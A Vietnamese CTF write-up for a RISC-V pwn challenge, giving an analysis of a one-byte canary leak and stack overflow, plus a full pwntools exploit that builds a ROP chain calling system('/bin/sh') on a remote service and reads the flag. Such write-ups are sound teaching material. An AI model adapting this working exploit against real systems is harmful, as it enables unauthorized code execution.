---
title: "PWN#Epsilon"
category: "Pwn"
tags: ["riscv64", "stack-overflow", "canary-leak", "ret2system", "static-binary", "qemu"]
solve_date: "2026-11-02T13:01:02+07:00"
language: "vi"
points: 64
---

# PWN#Epsilon — RISC-V vault: leak canary một byte rồi gọi system("/bin/sh")

**Flag:** CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}  
**Service:** nc 169.58.126.107 5003  
**Định dạng flag:** CTF{}

## Đề bài

> PWN#Epsilon — 64 điểm. Lấy shell trên host từ xa và đọc flag.

Handout chỉ có một binary vault:

```text
ELF 64-bit LSB executable, UCB RISC-V, RVC, double-float ABI,
statically linked, stripped, BuildID 8853ac948f2a7eaee1cb7640e5a3b247c1141a26
```

Binary không PIE, NX bật và có stack canary — checksec không phát hiện được vì binary static và stripped.

## Phân tích

### Hàm lỗi

main tại 0x10608 dùng frame 96 byte, trong đó name buffer dài 64 byte. Có hai lần read:

```c
read(0, buf, 65);            // one byte past the 64-byte buffer
printf("Hello, %s\n", buf);  // string leak
read(0, buf, 200);           // full overflow
```

Lần read đầu ghi 65 byte. Byte thứ 65 ghi đè byte least-significant của stack canary (thường là 0x00). Vì printf("%s") tiếp tục tới NUL tiếp theo, output sau tên chứa:

- 65 byte input;
- 7 byte canary còn lại;
- saved s0 và dữ liệu tiếp theo cho tới NUL.

Đủ dữ liệu để khôi phục canary:

```python
canary = u64(b"\x00" + leak[65:72])
```

Lần read thứ hai tạo stack overflow cổ điển ở offset 64.

### Gadgets

Binary static có sẵn toàn bộ thứ cần dùng mà không cần libc base:

| Symbol | Address | Mục đích |
|---|---:|---|
| GADGET_MV_A0 | 0x156b8 | ld ra,24(sp); mv a0,s0; ld s0,16(sp); addi sp,sp,32; ret |
| DO_SYSTEM | 0x10f6a | do_system(const char *line) |
| BIN_SH | 0x52ab8 | string "/bin/sh" |

Gadget nạp a0 từ saved s0 rồi return qua giá trị tại sp+24. Đặt "/bin/sh" vào saved s0 và do_system tại sp+24 sẽ gọi system("/bin/sh").

## Khai thác

```python
#!/usr/bin/env python3
from pwn import *

context.arch = "riscv64"

CANARY_OFF   = 64
GADGET_MV_A0 = 0x156b8
DO_SYSTEM    = 0x10f6a
BIN_SH       = 0x52ab8

p = remote("169.58.126.107", 5003)

p.recvuntil(b"Enter your name: ")
p.send(b"A" * 64 + b"B")

prompt = b"Leave a message for the vault keeper: "
data = p.recvuntil(prompt)
idx = data.find(b"Hello, ")
leak = data[idx + len(b"Hello, "):-len(prompt)]
if leak.endswith(b"\n"):
    leak = leak[:-1]

canary = u64(b"\x00" + leak[65:72])
log.success("canary = %#x" % canary)

payload  = b"A" * 64
payload += p64(canary)
payload += p64(BIN_SH)        # saved s0 -> a0 via the gadget
payload += p64(GADGET_MV_A0)  # saved ra
payload += p64(0)             # sp+0
payload += p64(0)             # sp+8
payload += p64(0)             # sp+16 (s0 reload)
payload += p64(DO_SYSTEM)     # sp+24 -> ra for the gadget
assert len(payload) == 120

p.send(payload)
p.recv(timeout=2)
p.sendline(b"cat /flag/flag.txt")
print(p.recv(timeout=4).decode(errors="replace"))
```

Shell remote chạy dưới quyền nobody; flag ở /flag/flag.txt.

```text
$ cat /flag/flag.txt
CTF{d45cfcb9f43f7d1a28b2f678b0b5c72f}
```

### Chạy lại trên local

Trước khi gửi lên remote, exploit được thử local bằng qemu-riscv64 và một busybox-static rootfs nhỏ:

```bash
qemu-riscv64 -L tools/fakeroot ./vault
```

Canary leak và control-flow chain hoạt động giống nhau dưới QEMU.

## Ghi chú

- Bug có chủ ý rất nhỏ: thêm một byte vào lần read đầu làm lộ canary qua greeting.
- RISC-V static binary thuận tiện ở đây — do_system và "/bin/sh" đều nằm trong image, không cần leak libc.
- Saved s0 được tái sử dụng làm argument của system(); gadget khôi phục nó vào a0 trước khi nhảy tới do_system.
